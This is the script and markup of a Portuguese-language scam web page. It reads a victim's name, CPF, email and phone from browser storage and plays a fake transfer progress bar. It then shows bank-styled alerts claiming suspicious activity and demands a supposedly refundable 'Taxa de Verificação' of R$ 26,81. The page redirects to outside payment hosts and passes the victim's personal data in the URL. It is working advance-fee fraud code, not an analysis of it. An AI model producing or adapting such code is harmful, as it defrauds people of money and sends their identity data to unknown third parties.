<body>

<!-- CARD INICIAL -->
<div class="card active" id="card">

  <a href="https://pay.pagtransacaobrasil.com/checkout/269b3d48-7d32-4b4b-910f-1e0aa91b0504"><button class="final-button" onclick="">Pagar Taxa de Verificação</button></a>

</div>

<script>
  // Puxa os dados salvos no localStorage
  const dados = JSON.parse(localStorage.getItem("dadosUsuario")) || {};
  const cpfRaw = localStorage.getItem("cpfUsuario") || "";
  const valor = localStorage.getItem("valorIndenizacao") || "R$ 7.854,63";

  const nomeCompleto = dados.NOME || "Usuário";
  const cpf = cpfRaw || "";
  const email = dados.EMAIL || ""; // Caso você tenha salvo isso
  const telefone = dados.TELEFONE || ""; // Caso tenha salvo isso também

  // Formata CPF
  function formatCPF(cpf) {
    const clean = cpf.replace(/\D/g, "");
    return clean.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
  }

  // Data atual formatada
  function getFormattedDate() {
    const d = new Date();
    return `${String(d.getDate()).padStart(2, '0')}/${String(d.getMonth() + 1).padStart(2, '0')}/${d.getFullYear()}`;
  }

  // Preenche o HTML com os dados
  document.getElementById("nome-completo").textContent = nomeCompleto;
  document.getElementById("cpf").textContent = cpf ? formatCPF(cpf) : "xxx.xxx.xxx-xx";
  document.getElementById("data").textContent = getFormattedDate();

  // Animações de alerta com spinner
  function exibirAlertasComSpinner() {
    const alerts = [
      { icon: "images/nu2.png", text: "Identificamos uma movimentação de valor alto suspeita!", red: false },
      { icon: "images/nu2.png", text: "Por motivos de segurança é preciso realizar o pagamento da Taxa de Verificação de Conta para garantir a transferência segura e evitar possíveis fraudes.", red: false },
      { icon: "images/nu2.png", text: "Finalize o pagamento da Taxa de Verificação de Conta no valor de <b>R$ 26,81</b> e confirme seu empréstimo. Essa taxa é reembolsável e será devolvida automaticamente após a confirmação do pagamento.", red: true },
    ];
    const wrapper = document.querySelector(".wrapper-final");
    wrapper.innerHTML = "";

    let index = 0;
    function showNext() {
      if (index >= alerts.length) return;

      const spinner = document.createElement("div");
      spinner.className = "spinner";
      wrapper.appendChild(spinner);

      setTimeout(() => {
        wrapper.removeChild(spinner);

        const alert = document.createElement("div");
        alert.className = `alert-box${alerts[index].red ? " red" : ""}`;
        const icon = document.createElement("img");
        icon.src = alerts[index].icon;
        icon.className = "icon-img";

        const text = document.createElement("div");
        text.innerHTML = alerts[index].text;

        alert.appendChild(icon);
        alert.appendChild(text);
        wrapper.appendChild(alert);

        requestAnimationFrame(() => alert.style.display = "flex");

        index++;
        setTimeout(showNext, 900);
      }, 1200);
    }

    showNext();
  }

  // Simula carregamento da transferência
  function iniciarTransferencia() {
    document.getElementById("card").classList.remove("active");
    document.getElementById("loading").classList.add("active");

    const bar = document.getElementById("bar");
    const statusText = document.getElementById("status-text");
    let progress = 0;
    let trocado = false;

    const interval = setInterval(() => {
      if (progress >= 100) {
        clearInterval(interval);
        document.getElementById("loading").classList.remove("active");
        document.getElementById("card-final").classList.add("active");
        exibirAlertasComSpinner();
      } else {
        progress++;
        bar.style.width = progress + "%";

        if (progress === 70 && !trocado) {
          trocado = true;
          statusText.classList.add("fade-out-up");
          setTimeout(() => {
            statusText.textContent = "Gerando Comprovante...";
            statusText.classList.remove("fade-out-up");
            statusText.classList.add("fade-in-up");
          }, 400);
        }
      }
    }, 50);
  }

  // Redireciona pro pagamento mantendo os mesmos dados
  function redirecionarParaPagamento() {
    const baseUrl = "https://pay.pagamentosfacilitadosoficial.shop/meABG9dJlxbZ6Ea";
    const params = new URLSearchParams();

    if (nomeCompleto) params.set("name", nomeCompleto);
    if (cpfRaw) params.set("document", cpfRaw);
    if (email) params.set("email", email);
    if (telefone) params.set("telephone", telefone);

    window.location.href = `${baseUrl}?${params.toString()}`;
  }
</script>
